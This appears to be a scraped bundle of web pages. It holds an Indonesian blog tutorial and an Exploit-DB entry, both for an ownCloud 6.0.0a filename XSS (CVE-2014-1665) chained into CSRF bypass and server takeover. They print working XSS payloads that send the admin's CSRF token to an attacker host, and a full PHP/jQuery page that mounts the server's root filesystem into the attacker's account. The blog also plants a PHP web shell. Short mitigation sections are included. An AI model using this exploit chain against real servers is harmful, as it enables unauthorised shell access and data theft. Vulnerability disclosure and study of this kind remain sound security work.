=== Content from blog.noobroot.com_24a8f6b1_20250125_024800.html ===


By visiting our site, you agree to our privacy policy regarding cookies, tracking statistics, etc.¬†[Read more](https://blog.noobroot.com/privacy-policy/)

Accept
X

[Skip to content](#main)
[![blog noobroot](https://blog.noobroot.com/wp-content/uploads/2024/12/cropped-Desain-tanpa-judul-png.webp)](https://blog.noobroot.com/)

* [facebook.com](https://www.facebook.com/)
* [twitter.com](https://twitter.com/)
* [t.me](https://t.me/)
* [instagram.com](https://www.instagram.com/)
* [youtube.com](https://youtube.com/)

Search for:

* [Home](https://blog.noobroot.com/)
* [Blog](https://blog.noobroot.com/author/amzahs/)
* Tools
  + [Perkiraan Cuaca](https://noobroot.com/weather)
* [Kontak](https://www.noobroot.com/contact)
* [Tentang Kami](https://www.blog.noobroot.com/about)
* [Privacy Policy](https://blog.noobroot.com/privacy-policy/)
* [Disclaimer](https://blog.noobroot.com/disclaimer/)

* [facebook.com](https://www.facebook.com/)
* [twitter.com](https://twitter.com/)
* [t.me](https://t.me/)
* [instagram.com](https://www.instagram.com/)
* [youtube.com](https://youtube.com/)

* [Home](https://blog.noobroot.com/)
* [Blog](https://blog.noobroot.com/author/amzahs/)
* Tools
  + [Perkiraan Cuaca](https://noobroot.com/weather)
* [Kontak](https://www.noobroot.com/contact)
* [Tentang Kami](https://www.blog.noobroot.com/about)
* [Privacy Policy](https://blog.noobroot.com/privacy-policy/)
* [Disclaimer](https://blog.noobroot.com/disclaimer/)

Search for:

[Beranda](https://blog.noobroot.com/) ¬ª OwnCloud 6.0.0a: When a XSS Vulnerability Gives a Shell on the Server!

Posted in[Tutorial](https://blog.noobroot.com/category/tutorial/)

# OwnCloud 6.0.0a: When a XSS Vulnerability Gives a Shell on the Server!

Posted by
![](https://secure.gravatar.com/avatar/59965d531b9d09d587e8465680de10d1?s=30&d=mm&r=g)
By [amzahs](https://blog.noobroot.com/author/amzahs/ "View all posts by amzahs")

Februari,2014![XSS Vulnerability Gives a Shell on the Server!](https://blog.noobroot.com/wp-content/uploads/2014/12/When-a-XSS-Vulnerability-Gives-a-Shell-on-the-Server.png)

Biasanya kerentanan Cross-Site Scripting (XSS) dianggap sebagai masalah "prioritas rendah" atau sesuatu yang berdampak minimal pada keamanan. Sering kali pola pikir ini mengakibatkan patch yang tertunda untuk masalah XSS karena ada "prioritas lebih tinggi" yang perlu ditangani. Ini adalah pola pikir yang berbahaya karena sering kali membahayakan server atau privasi pengguna jauh lebih rumit daripada menggunakan satu eksploitasi. Peretasan adalah tentang menggunakan kreativitas dan dengan kreativitas yang cukup, bahkan kerentanan XSS "kecil" akan membuka jalan bagi konsekuensi yang menghancurkan.

Hari ini saya akan menunjukkan bahwa kerentanan XSS "prioritas rendah" dan sedikit kreativitas dari peretas jahat dapat sangat membahayakan seluruh server. Pengumuman eksploitasi asli saya dapat ditemukan¬†¬†[di sini](http://www.exploit-db.com/exploits/31427/)¬†. Saya melaporkan masalah tersebut ke tim keamanan ownCloud beberapa waktu lalu dan masalah tersebut telah diperbaiki di 6.0.1.

Perlu diingat bahwa jika Anda ingin mencobanya sendiri, pastikan untuk mengubah IP/alamat/nama akun dalam kode. Selain itu, jika Anda mengalami masalah (hukum atau lainnya), maka Anda tidak dapat menyalahkan saya atas perilaku sembrono Anda sendiri. Posting ini hanya bertujuan untuk mendidik.

Harap diperhatikan: Saya memahami bahwa mungkin ada cara lain untuk memanfaatkan kerentanan XSS ini untuk memiliki server. Namun, karena nama file di Linux dibatasi hingga 255 karakter, saya rasa ini adalah metode yang paling mudah.

**‚Äã‚ÄãPengaturan kami:**
Server: Debian 7.3.0 64-bit
Konfigurasi: LAMP (Linux, Apache, MySQL, dan PHP) Umum
Aplikasi Web: ownCloud 6.0.0a
Mesin Penyerang: Kali Linux
Peramban yang rentan: Iceweasel 22.0; Internet Explorer 11.

Kami mulai dengan instalasi bersih server LAMP dan ownCloud 6.0.0a. Basis data yang Anda pilih selama instalasi ownCloud tidak menjadi masalah. Pengguna admin dapat berupa nama apa pun yang Anda suka. Dalam video, kami menggunakan "admin".

Setelah Anda menyiapkan, buat akun lain bernama "hacker". Pengguna ini seharusnya tidak termasuk dalam grup mana pun.

Anda sekarang seharusnya memiliki dua akun pengguna:

[![](https://web.archive.org/web/20140218223317im_/http://3.bp.blogspot.com/-ShZgnNuBEco/UwFbeOMEopI/AAAAAAAAGGw/Q9sLbO_csvY/s1600/users.png)](https://blog.noobroot.com/2014/12/02/owncloud-600a-when-xss-vulnerability-html/)

Jika Anda ingin menjaga semuanya tetap bersih, pastikan untuk masuk ke kedua akun dan menghapus semua file bawaan akun baru. Meskipun tidak perlu memiliki folder yang bersih untuk latihan ini, hal ini membantu membuat semuanya tampak teratur.

Sekarang, kita siap untuk memulai.

* **Menemukan Kerentanan**

OwnCloud mencegah pembuatan file dengan karakter berikut dalam namanya:

* *'\', '/', '<', '>', ':', '"', '|', '?' dan '\*' tidak diizinkan.*

[![](https://web.archive.org/web/20140218223317im_/http://4.bp.blogspot.com/-ELDsopxjmWM/UwFa3ozNThI/AAAAAAAAGGo/JTeASW2rcQ8/s1600/illegal+chars.png)](https://blog.noobroot.com/2014/12/02/owncloud-600a-when-xss-vulnerability-html/)

Hal ini dapat dipahami dan banyak aplikasi cloud melakukan hal yang sama. Salah satu alasan untuk mencegah karakter ini adalah untuk mengurangi potensi kerentanan XSS yang mungkin ada dalam kode yang tidak membersihkan nama file sebelum menampilkannya kepada pengguna.

OwnCloud tidak akan mengizinkan kita untuk langsung membuat file baru yang berisi karakter yang tidak valid, tetapi kita tentu dapat mencoba untuk melewati batasan ini. Saya menunjukkan satu metode dalam video di atas, tetapi metode lainnya adalah dengan menggunakan BurpSuite.

Kita akan membuat file bernama "<img src=x onerror=alert(0);>" untuk menyajikan bukti konsep bahwa kita dapat membuat file dengan karakter yang tidak valid. Setelah kita membuat file ini, kita akan menunjukkan bahwa kita dapat menyebabkan kode JavaScript ini dijalankan ketika kita mencoba menghapus file https://www.youtube.com/embed/eA2\_7xvDYCQ?rel=0&vq=hd720&wmode=opaque Ini bagus: kita memiliki kerentanan XSS!

* **Membuat Muatan dan Rencana**

Apa yang harus kita lakukan? Salah satu pilihannya adalah mencoba membuka iframe. Akan tetapi, kita tidak dapat melakukannya karena HTML mengharuskan tag iframe ditutup dengan . Karena server web menjalankan Linux, karakter '/' tidak sah dalam nama file dan karenanya kita tidak dapat melakukannya.

Yang dapat kita lakukan adalah mengarahkan korban ke server penyerang kita. Ini dapat dilakukan dengan contoh nama file berikut:

| **<img**¬†**src=**x¬†**onerror=**"document.location='http:&#x2F;&#x2F;noobroot.com'";**>**.txt |
| --- |

Ada beberapa hal yang perlu diperhatikan tentang kode ini.

1. Ini adalah muatan XSS standar yang dapat digunakan saat tag penutup tidak dapat digunakan (seperti dalam kasus kami). Seperti yang Anda lihat, nilai "src" selalu tidak valid sehingga ini akan menyebabkan kode kami di depan "onerror" dieksekusi.
2. URL yang kami kirim ke korban kami adalah http://noobroot.com. Seperti yang dapat kita lihat, URL ini berisi karakter tidak valid '/' yang tidak dapat kita gunakan. Kita dapat mengatasinya dengan menggunakan entitas HTML / sebagai ganti setiap karakter '/' karena setiap entitas menggantikan teks sebenarnya. Ini juga menjelaskan mengapa kita tidak dapat menggunakan </iframe> untuk menutup iframe kita.
3. Kita harus mengakhiri payload kita dengan ekstensi seperti txt. Jika tidak, payload kita akan terpotong di bagian .com karena ownCloud akan menganggapnya sebagai ekstensi:

<img src=x onerror="lokasi dokumen='http://noobroot.com¬†**'";>**

Bagian yang berwarna kuning adalah muatan kita. Karena kodenya tidak valid, muatan itu tidak akan dijalankan.

Untuk menguji muatan baru kita, kita akan mempermudah dan melewati penggunaan BurpSuite. Sebagai gantinya, kita akan membuat berkas ini di sistem kita dan kemudian mengunggahnya dengan cara normal seperti pengguna mengunggah berkas di ownCloud. Anda akan melihat bahwa ketika Anda mengunggahnya, kode tersebut langsung dijalankan di sistem Anda sendiri. Abaikan saja ini. Setelah berkas diunggah, uji apakah muatan berbahaya kita berfungsi ketika kita mencoba menghapusnya. Yang perlu kita lakukan sekarang adalah membagikan berkas ini dengan administrator situs!

Jadi sekarang kita dapat mengarahkan korban kita ke situs web mana pun yang kita suka, ke mana kita akan mengarahkannya dan apa yang akan kita lakukan? Mari kita kuasai servernya! Bagaimana kita melakukannya? Nah, ownCloud memungkinkan administrator situs untuk mengaktifkan add-on guna memasang sumber penyimpanan eksternal seperti Box.com, Google Drive, hard drive eksternal, dan bahkan sistem berkas lokal server. Secara default, add-on External Storage Support dinonaktifkan dan meskipun diaktifkan, kecil kemungkinan seluruh sistem berkas akan dipasang.

Ini tidak masalah. Sebagai penyerang, kita dapat menggunakan kerentanan XSS yang baru kita temukan untuk mencuri token CSRF dan memaksa administrator untuk mengaktifkan External Storage Support dan memasang sistem berkas lokal server ke akun ownCloud milik penyerang.

Bagaimana kita bisa mendapatkan token CSRF? Nilai token sebenarnya ada di tag head dalam kode HTML:

Dengan memodifikasi muatan XSS kami untuk mengambil token ini:

| **<img**¬†**src=**x¬†**onerror=**"var z=document.getElementsByTagName('head')[0].getAttribute('data-requesttoken'); document.location='http:&#x2F;&#x2F;noobroot.com&#x2F;owncloudhack.php?rt='+z";**>**.txt |
| --- |

Untuk memahami hal ini, mari kita lihat apa yang dilakukan bagian dalam event handler "onerror":

1) var z=document.getElementsByTagName('head')[0].getAttribute('data-requesttoken');

2) document.location='http://noobroot.com/owncloudhack.php?rt='+z

Kita dapat melihat bahwa kode dalam 1) memperoleh nilai data-requesttoken dan menetapkan variabel z ke dalamnya. Dan, kita dapat melihat bahwa 2) mengubah halaman dokumen menjadi http://noobroot.com/owncloudhack.php dan meneruskan z (yang berisi token) sebagai nilai parameter untuk rt.

* **Berusaha Melakukan Kill di website**

Sekarang setelah kita memiliki akses ke token CSRF, saatnya untuk memanfaatkannya. Kita akan menggunakan PHP dan jQuery untuk membuat permintaan ke ownCloud untuk:

1. aktifkan penyimpanan eksternal,
2. memasang sistem file lokal server untuk penyerang, dan
3. mengarahkan admin kembali ke akun ownCloud miliknya.

Kode berikut, yang akan kita sebut "owncloudhack.php" dan dihosting di server web, akan mengurus hal ini untuk kita:

| ***<!DOCTYPE HTML>*****<html**>**<head>****<meta**¬†**http-equiv=**"Content-Type"¬†**content=**"text/html; charset=UTF-8"**>****<title>**OwnCloud 6.0.0a XSS and CSRF Protection Bypass**</title>****<script type=**"text/javascript"¬†**src=**"http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"**>****</script>****</head>****<body>****<span**¬†**id=**"container"**></span>****<form**¬†**id=**"form1"**>****<input**¬†**type=**"hidden"¬†**name=**"mountPoint"¬†**value=**"LOL"**>****<input**¬†**type=**"hidden"¬†**name=**"class"¬†**value=**"\OC\Files\Storage\Local"**>****<input**¬†**type=**"hidden"¬†**name=**"classOptions[datadir]"¬†**value=**"/"**>****<input**¬†**type=**"hidden"¬†**name=**"mountType"¬†**value=**"user"**>****<input**¬†**type=**"hidden"¬†**name=**"applicable"¬†**value=**"hacker"**>****<input**¬†**type=**"hidden"¬†**name=**"isPersonal"¬†**value=**"false"**>*****<?php***¬†**echo**¬†'<input type="hidden" name="requesttoken" value="'.$\_GET["rt"].'">'¬†***?>*****</form>****<script>**¬†$('#form1').submit(**function**(event) { event.preventDefault(); $.ajax({ type: 'POST', url: 'http://192.168.196.243/index.php/apps/files\_external/ajax/addMountPoint.php', data: $(**this**).serialize(), xhrFields: { withCredentials:¬†**true**¬†}, dataType: 'json', }); });¬†**</script>****<form**¬†**id=**"form2"**>**¬†**<input**¬†**type=**"hidden"¬†**name=**"appid"¬†**value=**"files\_external"**>*****<?php***¬†**echo**¬†'<input type="hidden" name="requesttoken" value="'.$\_GET["rt"].'">'¬†***?>*****</form>****<script>**¬†$('#form2').submit(**function**(event) { event.preventDefault(); $.ajax({ type: 'POST', url: 'http://192.168.196.243/index.php/settings/ajax/enableapp.php', data: $(**this**).serialize(), xhrFields: { withCredentials:¬†**true**¬†}, dataType: 'json', }); });¬†**function**¬†ext() { $('#form2').submit(); $("#container").text("Enabling External Storage..."); };¬†**function**¬†mount() { $('#form1').submit(); $("#container").text("Mounting the root filesystem..."); };¬†**function**¬†redirect() { window.location.href = 'http://192.168.196.243/'; $("#container").text("Redirecting back home ;)"); }; setTimeout(**function**() {ext();},¬†**0**); setTimeout(**function**() {mount();},¬†**5000**); setTimeout(**function**() {redirect();},¬†**5500**);¬†**</script>****</body>****</html>** |
| --- |

Satu-satunya parameter yang diambil kode ini adalah rt, yang seharusnya merupakan token permintaan. Ketika nilai ini diberikan, sejumlah permintaan POST yang valid dibuat tanpa sepengetahuan administrator ownCloud.

Ketika administrator diarahkan kembali ke server ownCloud miliknya, akan tampak seolah-olah file tersebut telah dihapus dan selain pengalihan singkat yang sangat aneh, sekilas semuanya tampak normal.

Kita seharusnya dapat meletakkan owncloudhack.php pada server penyerang dan menggabungkannya dengan file XSS untuk memperoleh akses ke server.

* **Perampokan**

Sekarang saatnya memasang shell di server. Ini juga bagian yang mudah!

Dengan asumsi bahwa kita meminta admin untuk mencoba menghapus file berbahaya yang kita bagikan dengannya dan skrip kita berhasil memaksa pemasangan sistem berkas root ke akun ownCloud kita, kita akan melihat folder "LOL" baru untuk akun kita:

[![](https://web.archive.org/web/20140218223317im_/http://3.bp.blogspot.com/-T3rruB6805A/UwNZb7jjHUI/AAAAAAAAGHc/e1B7IodIUF0/s1600/LOL.png)](https://blog.noobroot.com/2014/12/02/owncloud-600a-when-xss-vulnerability-html/)

Ini adalah alias yang digunakan skrip PHP kita untuk sistem berkas root!

Jika kita menelusurinya, kita akan melihat bahwa kita memiliki akses ke semua hal yang dapat diakses oleh pengguna www-data. Misalnya, kita dapat menavigasi ke /var/www:

[![](https://web.archive.org/web/20140218223317im_/http://3.bp.blogspot.com/-YEG2q013Y50/UwNbdNym8MI/AAAAAAAAGHo/4kHQs1VgO2g/s1600/varwww.png)](https://web.archive.org/web/20140218223317mp_/http%3A//3.bp.blogspot.com/-YEG2q013Y50/UwNbdNym8MI/AAAAAAAAGHo/4kHQs1VgO2g/s1600/varwww.png)

Di dalam /var/www, mari buat skrip shell PHP dasar yang disebut shell.php:

[![](https://web.archive.org/web/20140218223317im_/http://4.bp.blogspot.com/-qD80BBxPO5A/UwNb9ZuSGsI/AAAAAAAAGHw/CaQEEyuTRGg/s1600/shell.png)](https://blog.noobroot.com/2014/12/02/owncloud-600a-when-xss-vulnerability-html/)

Sekarang, kita seharusnya dapat menavigasi ke http://192.168.196.243/shell.php?cmd=id untuk menjalankan perintah 'id':

[![](https://web.archive.org/web/20140218223317im_/http://4.bp.blogspot.com/-nFZUjqadwaw/UwNcZGQOeII/AAAAAAAAGH4/-y7Ma9mnmC0/s1600/id.png)](https://blog.noobroot.com/2014/12/02/owncloud-600a-when-xss-vulnerability-html/)

Dari sini, sisanya terserah Anda üôÇ

* **Mitigasi**

Jika Anda menjalankan ownCloud, sebaiknya Anda selalu memperbaruinya. Versi terbaru telah ditambal untuk mengatasi masalah ini karena saya telah melaporkannya kepada pengembang.

Di sisi klien, ada beberapa hal yang dapat dilakukan. Jika ada file mencurigakan yang dibagikan kepada Anda, Anda dapat mencegah serangan dengan menghubungkan ke server Anda melalui SSH dan menghapus file tersebut secara manual dari sistem. Selain itu, gunakan Firefox atau Google Chrome. Internet Explorer dan Iceweasel rentan terhadap serangan ini. Pilihan lainnya adalah menggunakan NoScript untuk browser berbasis Mozilla (seperti FireFox, Iceweseal, Waterfox, dll).

Mengenai masalah CSRF, tidak ada yang dapat dilakukan di sisi klien. Namun, hal baiknya adalah ownCloud menggunakan token dan tanpa bantuan serangan XSS, token ini akan mencegah browser Anda memenuhi permintaan yang tidak Anda maksudkan.

Terakhir, untuk server hardening: praktik dasar berlaku di sini. Misalnya:

1. Nonaktifkan fungsi PHP seperti sistem, eval, dll.
2. Tetapkan izin yang benar untuk web root.
3. Dll...

Share via:

* Facebook
* X (Twitter)
* LinkedIn
* More

Last updated on Desember,2024

![](https://secure.gravatar.com/avatar/59965d531b9d09d587e8465680de10d1?s=75&d=mm&r=g)
[amzahs](https://blog.noobroot.com/author/amzahs/)

NoobRoot adalah platform yang didedikasikan untuk memudahkan Anda dalam memahami teknologi.
Kami menyediakan panduan yang sederhana, ulasan alat teknologi, dan tips praktis untuk membantu Anda dalam menguasai teknologi sehari-hari.
[View All Posts](https://blog.noobroot.com/author/amzahs/)

## Post navigation

###### Previous Post

[![Kaspersky Anti-Virus 2014 No Recomended](https://blog.noobroot.com/wp-content/uploads/2024/12/kaspersky-anti-virus--150x150.webp) Kaspersky Anti-Virus 2014 No Recomended](https://blog.noobroot.com/2013/09/bypassing-kaspersky-anti-virus-2014-html/)
###### Next Post

[Tips Membuat Website Pemula? Ikuti 5 Langkah Mudah Ini! ![Membuat website pemula dengan mudah](https://blog.noobroot.com/wp-content/uploads/2024/12/membuat-website-pemula-150x150.png)](https://blog.noobroot.com/2024/12/panduan-membuat-website-pemula/)

## [About](https://www.noobroot.com/#about)

## [Contact Us](https://www.noobroot.com/contact)

## [Disclaimer](https://blog.noobroot.com/disclaimer)

## [Privacy Policy](https://blog.noobroot.com/privacy-policy)

## [Sitemap](https://blog.noobroot.com/sitemap.xml)

www.blog.noobroot.com

Copyright 2025 ‚Äî All rights reserved

Scroll to Top

* Facebook
* X (Twitter)
* LinkedIn
* More Networks

Share via

Facebook

X (Twitter)

LinkedIn

Mix

Email

Print

Copy Link

Copy link

CopyCopied



=== Content from packetstormsecurity.com_f1f748f4_20250125_024802.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

¬†[About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.exploit-db.com_ba0fe21a_20250125_024803.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# ownCloud 6.0.0a - Multiple Vulnerabilities

#### EDB-ID:

###### 31427

#### CVE:

###### [2014-1665](https://nvd.nist.gov/vuln/detail/CVE-2014-1665)

---

**EDB Verified:**

#### Author:

###### [absane](/?author=6369)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [PHP](/?platform=php)

#### Date:

###### 2014-02-05

---

**Vulnerable App:**

```
# Exploit Title:     ownCloud 6.0.0a File Deletion XSS and CSRF Protection Bypass
# Vendor Homepage:   www.ownCloud.org
# OwnCloud Version:  6.0.0a
# Browsers tested:   Iceweasel 22.0; Internet Explorer 11;
# Server:            Debian. Default LAMP set-up.
# Exploit Author:    James Sibley (absane)
# Blog:              http://blog.noobroot.com
# Discovery date:    December 12th, 2013
# Vendor notified:   December 12th, 2013
# Vendor fixed:      January 22th, 2014
# CVE assignment:    CVE-2014-1665

A malicious ownCloud user can upload a file with JavaScript code in the filename, share it, and cause a XSS attack when the victim tries to either view the contents of the file or delete the file.

If the victim is an ownCloud administrator, an attacker can force the mounting of the webserver's local file system, leading to unauthorized access to server resources and potentially shell access.

=======================
=Proof of Concept.....=
=======================
1) Create a file named <img src=x onerror=alert(0);>.txt (on a Linux machine)
2) Upload it to OwnCloud by clicking on the Upload button (up arrow next to "new") on the Web UI.
3) Share the file with the victim.
4) When the victim sees the shared file in their "Shared" directory, they can:
	a) View the contents of the file within OwnCloud, or
	b) become suspicious of the file and attempt to delete it.

Both a) and b) options will result in Javascript being executed in the victim's web browser.

=======================
=Exploit..............=
=======================

**                                                                      **
** NOTE: Replace [ATTACKER'S WEBSERVER] with the attacker's domain/IP.  **
** NOTE: Replace [ATTACKER] with the attacker's account on ownCloud.    **
** NOTE: Replace [VICTIM] with the victim's ownCloud domain/IP.         **
**                                                                      **

** Filename (share a malicious file with this name):

<img src=x onerror="var z=document.getElementsByTagName('head')[0].getAttribute('data-requesttoken');
document.location='http://[ATTACKER'S WEBSERVER]/ownCloudhack.php?rt='+z";>

** Code (ownCloudhack.php):

<!DOCTYPE HTML>
<html>
<head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>OwnCloud 6.0.0a XSS and CSRF Protection Bypass</title>
        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
</head>
<body>
	<span id="container"></span>
        <form id="form1">
                <input type="hidden" name="mountPoint" value="LOL">
                <input type="hidden" name="class" value="\OC\Files\Storage\Local">
                <input type="hidden" name="classOptions[datadir]" value="/">
                <input type="hidden" name="mountType" value="user">
                <input type="hidden" name="applicable" value="[ATTACKER]">
                <input type="hidden" name="isPersonal" value="false">
                <?php echo '<input type="hidden" name="requesttoken" value="'.$_GET["rt"].'">' ?>
        </form>
	<script>
        $('#form1').submit(function(event) {
                event.preventDefault();
                $.ajax({
                        type: 'POST',
                        url: 'http://[VICTIM]/index.php/apps/files_external/ajax/addMountPoint.php',
                        data: $(this).serialize(),
		        xhrFields: {
			     withCredentials: true
		        },
                        dataType: 'json',
                });
        });
        </script>

        <form id="form2">
                <input type="hidden" name="appid" value="files_external">
                <?php echo '<input type="hidden" name="requesttoken" value="'.$_GET["rt"].'">' ?>
        </form>
	<script>
        $('#form2').submit(function(event) {
                event.preventDefault();
                $.ajax({
                        type: 'POST',
                        url: 'http://[VICTIM]/index.php/settings/ajax/enableapp.php',
                        data: $(this).serialize(),
		        xhrFields: {
			     withCredentials: true
		        },
                        dataType: 'json',
                });
        });

	function ext() {
		$('#form2').submit();
		$("#container").text("Enabling External Storage...");
	};
	function mount() {
		$('#form1').submit();
		$("#container").text("Mounting the root filesystem...");
	};
	function redirect() {
		window.location.href = 'http://[VICTIM]/';
		$("#container").text("Redirecting back home ;)");
	};
	setTimeout(function() {ext();}, 0);
	setTimeout(function() {mount();}, 5000);
	setTimeout(function() {redirect();}, 5500);
	</script>
</body>
</html>

=======================
=Mitigation...........=
=======================
Upgrade to ownCloud 6.0.1 or greater.

If upgrading is not an option, then the file can be removed by either
1) manually removing the file from the disk via command line interface, or
2) first renaming the file to something else and then deleting the file.

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

¬©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

√ó

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as ‚ÄúGoogle Hacking‚Äù was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny‚Äôs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term ‚ÄúGoogledork‚Äù to refer
to ‚Äúa foolish or inept person as revealed by Google‚Äú. This was meant to draw attention to
the fact that this was not a ‚ÄúGoogle problem‚Äù but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term ‚Äúdork‚Äù became shorthand for a search query that located sensitive
information and ‚Äúdorks‚Äù were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

√ó

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

√ó

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

